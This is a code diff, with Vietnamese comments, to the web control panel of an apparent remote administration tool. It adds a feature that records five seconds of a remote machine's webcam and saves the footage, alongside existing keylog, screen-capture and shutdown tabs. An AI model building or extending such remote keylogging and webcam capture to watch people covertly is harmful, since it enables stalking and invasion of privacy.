@@ -65,6 +65,16 @@
         }
         .close-modal:hover { color: #bbb; }
         #screen-img { cursor: zoom-in; }
+        /* CSS cho Video Player container */
+        #view-webcam {
+            text-align: center; padding: 20px; background: #222;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .btn-download {
+            display: inline-block; margin-top: 15px; padding: 10px 20px;
+            background: #007bff; color: white; text-decoration: none; border-radius: 5px; font-weight: bold;
+        }
+        .btn-download:hover { background: #0056b3; }
     </style>
 </head>
 <body>
@@ -89,7 +99,6 @@
     
     <div class="content">
         <div class="view-panel">
-            
             <div id="toolbar-apps" class="toolbar">
                 <button class="btn-refresh" onclick="sendCmd('listApps')">🔄 Làm mới</button>
                 <div style="flex:1"></div>
@@ -125,6 +134,13 @@
                 <span style="color:#666; font-size:13px">Các lệnh này sẽ được thực hiện ngay lập tức.</span>
             </div>
 
+            <div id="toolbar-webcam" class="toolbar hidden">
+                <button class="btn-refresh" onclick="sendCmd('get_cam')">📹 Quay 5 giây</button>
+                <button id="btn-save-video" class="btn-exec" onclick="exportAndDownload()">💾 Lưu Video</button>
+                <div style="flex:1"></div>
+                <span style="color:#666; font-size:13px">Ghi hình từ webcam và xem lại.</span>
+            </div>
+
             <div id="view-keylog" class="hidden scroll-area" style="padding: 15px;">
                 <textarea id="txtKeylogs" style="width: 95%; height: 95%; background: #222; color: #0f0; font-family: monospace; border: none; padding: 10px; resize: none;" readonly placeholder="Chưa có dữ liệu log..."></textarea>
             </div>
@@ -133,7 +149,31 @@
                 <div id="loading-screen" style="color: white; display: none;">⏳ Đang nhận dữ liệu ảnh...</div>
                 <img id="screen-img" onclick="openModal()" style="max-width: 100%; max-height: 100%; border: 2px solid #fff; box-shadow: 0 0 20px rgba(0,0,0,0.5);" />
             </div>
+            <div id="view-webcam" class="hidden scroll-area" style="height: 100%;">
+                <div id="cam-status" style="color: #ccc; margin-top: 20px; text-align: center;">
+                    Bấm "Quay 5 giây" để bắt đầu.
+                </div>
+                <div id="loading-cam" style="color: #ffd700; display: none; text-align: center; margin-top: 20px; font-size: 18px;">
+                    ⏳ Đang ghi hình (5s) và nén dữ liệu...
+                </div>
 
+                <div id="video-player-container" class="hidden" style="display: flex; flex-direction: column; align-items: center; margin-top: 10px;">
+                    
+                    <div style="position: relative; border: 2px solid #555; background: black; line-height: 0;">
+                        <img id="video-screen" style="max-width: 640px; width: 100%; height: auto;" />
+                        <div id="replay-overlay" style="position: absolute; top:0; left:0; width:100%; height:100%; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); cursor: pointer;" onclick="playVideo()">
+                            <span style="color: white; font-size: 50px;">▶</span>
+                        </div>
+                    </div>
+
+                    <div style="width: 640px; max-width: 100%; background: #333; padding: 10px; box-sizing: border-box; display: flex; gap: 10px; align-items: center;">
+                        <button onclick="playVideo()" style="background: #28a745; width: 40px;">▶</button>
+                        <button onclick="pauseVideo()" style="background: #dc3545; width: 40px;">⏸</button>
+                        <input type="range" id="video-seeker" min="0" max="100" value="0" style="flex: 1;" oninput="seekVideo(this.value)">
+                        <span id="frame-counter" style="color: white; font-family: monospace; font-size: 12px;">0/0</span>
+                    </div>
+                </div>
+            </div>
             <div id="view-tables" class="scroll-area">
                 <table id="table-apps">
                     <thead>
@@ -219,6 +259,12 @@
                     log(`[${json.trang_thai}] ${json.thong_bao}`);
                     if(json.trang_thai === 'thanh_cong') refreshCurrentTab();
                 }
+                else if (json.type === 'video_stream') {
+                    document.getElementById('loading-cam').style.display = 'none';
+                    document.getElementById('cam-status').style.display = 'none';
+                    loadVideoPlayer(json.data); // Gọi hàm Player mới viết
+                    log("Đã nhận video (" + json.data.length + " frames).");
+                }
             } catch (e) {
                 log("Server: " + data);
             }
@@ -239,7 +285,7 @@
         event.target.classList.add('active');
 
         // 2. Ẩn HẾT toolbar
-        ['apps', 'processes', 'screen', 'keylog', 'shutdown'].forEach(t => {
+        ['apps', 'processes', 'screen', 'keylog', 'shutdown','webcam'].forEach(t => {
             document.getElementById(`toolbar-${t}`).classList.add('hidden');
         });
 
@@ -247,6 +293,7 @@
         document.getElementById('view-tables').classList.add('hidden');
         document.getElementById('view-screen').classList.add('hidden');
         document.getElementById('view-keylog').classList.add('hidden');
+        document.getElementById('view-webcam').classList.add('hidden');
 
         // 4. Hiện view tương ứng
         document.getElementById(`toolbar-${tab}`).classList.remove('hidden');
@@ -271,6 +318,9 @@
         }
         else if (tab === 'shutdown') {
             // Không cần hiển thị view khác, chỉ hiện toolbar
+        }
+        else if (tab === 'webcam') {
+            document.getElementById('view-webcam').classList.remove('hidden');
         }
         
         // Không auto-refresh tab screen/keylog/shutdown để tiết kiệm băng thông
@@ -320,6 +370,10 @@
             socket.send(cmd);
             if (cmd === 'get_screen') {
                 document.getElementById('loading-screen').style.display = 'block';
+            }
+            if (cmd === 'get_cam') {
+                document.getElementById('loading-cam').style.display = 'block';
+                document.getElementById('cam-status').style.display = 'none';
             }
         }
     }
@@ -436,7 +490,142 @@
         
         tempImg.src = img.src;
     }
+    // --- VIDEO PLAYER LOGIC ---
+    let videoFrames = []; // Mảng chứa toàn bộ frame ảnh
+    let isPlaying = false;
+    let currentFrameIdx = 0;
+    let playInterval = null;
+    const FPS = 30; // Tốc độ chiếu (phải khớp với Server)
 
+    // Cập nhật socket.onmessage để hứng type 'video_stream'
+    // Tìm đoạn socket.onmessage cũ và thêm else if này vào:
+    /*
+    else if (json.type === 'video_stream') {
+        document.getElementById('loading-cam').style.display = 'none';
+        document.getElementById('cam-status').style.display = 'none';
+        
+        // Load dữ liệu vào Player
+        loadVideoPlayer(json.data);
+        log("Đã nhận video (" + json.data.length + " frames).");
+    }
+    */
+
+    function loadVideoPlayer(frames) {
+        videoFrames = frames;
+        currentFrameIdx = 0;
+        
+        const player = document.getElementById('video-player-container');
+        player.classList.remove('hidden');
+        player.style.display = 'flex'; // Fix display flex bị class hidden ghi đè
+        
+        // Cập nhật thanh trượt
+        const seeker = document.getElementById('video-seeker');
+        seeker.max = frames.length - 1;
+        seeker.value = 0;
+
+        // Hiển thị frame đầu tiên
+        showFrame(0);
+        
+        // Tự động play
+        playVideo();
+    }
+
+    function showFrame(index) {
+        if (index < 0 || index >= videoFrames.length) return;
+        
+        const img = document.getElementById('video-screen');
+        // Gán ảnh JPEG Base64
+        img.src = "data:image/jpeg;base64," + videoFrames[index];
+        
+        // Cập nhật UI
+        document.getElementById('video-seeker').value = index;
+        document.getElementById('frame-counter').innerText = `${index + 1}/${videoFrames.length}`;
+        currentFrameIdx = index;
+    }
+
+    function playVideo() {
+        if (isPlaying) return;
+        isPlaying = true;
+        document.getElementById('replay-overlay').style.display = 'none';
+
+        // Nếu đang ở cuối video thì tua về đầu
+        if (currentFrameIdx >= videoFrames.length - 1) {
+            currentFrameIdx = 0;
+        }
+
+        playInterval = setInterval(() => {
+            currentFrameIdx++;
+            if (currentFrameIdx >= videoFrames.length) {
+                pauseVideo(); // Hết video thì dừng
+                document.getElementById('replay-overlay').style.display = 'flex'; // Hiện nút Replay
+            } else {
+                showFrame(currentFrameIdx);
+            }
+        }, 1000 / FPS);
+    }
+
+    function pauseVideo() {
+        isPlaying = false;
+        clearInterval(playInterval);
+    }
+
+    function seekVideo(val) {
+        pauseVideo(); // Dừng chạy tự động khi đang kéo
+        showFrame(parseInt(val));
+    }
+
+    // --- SỬA LẠI SENDCMD CHO WEBCAM ---
+    // (Tìm hàm sendCmd cũ và sửa đoạn if get_cam)
+    /*
+    if (cmd === 'get_cam') {
+        document.getElementById('loading-cam').style.display = 'block';
+        document.getElementById('video-player-container').classList.add('hidden'); // Ẩn player cũ
+        document.getElementById('cam-status').style.display = 'none';
+    }
+    */
+    async function exportAndDownload() {
+        if (!videoFrames.length) { alert("Chưa có video!"); return; }
+
+        // Prefer toolbar save button; fallback to event.target if available
+        let btn = document.getElementById('btn-save-video');
+        let hadBtn = true;
+        if (!btn) {
+            try { btn = event ? event.target : null; hadBtn = !!btn; } catch { hadBtn = false; }
+        }
+        let oldText = hadBtn ? (btn.innerText || '') : '';
+        if (hadBtn) { btn.innerText = "⏳ Tạo file..."; btn.disabled = true; }
+
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        const tempImg = new Image();
+        tempImg.src = "data:image/jpeg;base64," + videoFrames[0];
+        await new Promise(r => tempImg.onload = r);
+        canvas.width = tempImg.width; canvas.height = tempImg.height;
+
+        const stream = canvas.captureStream(FPS);
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = `webcam_${Date.now()}.webm`;
+            document.body.appendChild(a); a.click(); document.body.removeChild(a);
+            if (hadBtn && btn) { btn.innerText = oldText; btn.disabled = false; }
+        };
+
+        recorder.start();
+        for (let i = 0; i < videoFrames.length; i++) {
+            await new Promise(resolve => {
+                const img = new Image();
+                img.onload = () => { ctx.drawImage(img, 0, 0); resolve(); };
+                img.src = "data:image/jpeg;base64," + videoFrames[i];
+            });
+            await new Promise(r => setTimeout(r, 1000/FPS));
+        }
+        recorder.stop();
+    }
     window.onload = connect;
 </script>
 </body>
